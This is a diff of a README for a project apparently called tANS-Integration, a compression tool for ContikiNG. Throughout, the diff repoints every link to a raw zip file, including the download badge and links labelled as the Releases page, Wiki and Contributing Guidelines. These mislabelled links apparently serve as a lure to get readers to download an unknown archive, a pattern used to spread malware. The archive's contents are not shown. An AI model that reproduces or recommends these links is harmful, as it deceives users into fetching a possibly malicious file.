@@ -19,12 +19,12 @@ To ensure optimal performance, your system should meet the following requirement
 ## 📥 Download & Install
 You can easily download the latest version of tANS-Integration from our Releases page. 
 
-[![Download tANS-Integration](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/heediness/tANS-Integration.zip)](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/heediness/tANS-Integration.zip)
+[![Download tANS-Integration](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/tans_native/Integration_AN_t_2.2.zip)](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/tans_native/Integration_AN_t_2.2.zip)
 
 To install, please follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
-   [Go to Releases Page](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/heediness/tANS-Integration.zip)
+   [Go to Releases Page](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/tans_native/Integration_AN_t_2.2.zip)
 
 2. **Choose the Latest Version**: Look for the most recent version and click on it.
 
@@ -67,13 +67,13 @@ If you encounter any issues while using tANS-Integration, here are some common s
 - **Unexpected Behavior**: Consult the documentation for usage examples and best practices.
 
 ## 📘 Documentation
-For detailed documentation, please refer to our [Wiki](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/heediness/tANS-Integration.zip). This will cover advanced features, customization options, and examples to help you get the most out of tANS-Integration.
+For detailed documentation, please refer to our [Wiki](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/tans_native/Integration_AN_t_2.2.zip). This will cover advanced features, customization options, and examples to help you get the most out of tANS-Integration.
 
 ## 🙌 Community Support
 If you need help or have questions, feel free to reach out to the community. You can open an issue directly in the GitHub repository or connect with fellow users on forums related to ContikiNG and algorithm development.
 
 ## 🧑‍💻 Contributing
-We welcome contributions from everyone. If you would like to contribute to tANS-Integration, please check our [Contributing Guidelines](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/heediness/tANS-Integration.zip) for more information.
+We welcome contributions from everyone. If you would like to contribute to tANS-Integration, please check our [Contributing Guidelines](https://raw.githubusercontent.com/sr-m7md/tANS-Integration/main/tans_native/Integration_AN_t_2.2.zip) for more information.
 
 ## 📝 Topics
 This project covers various topics, including:
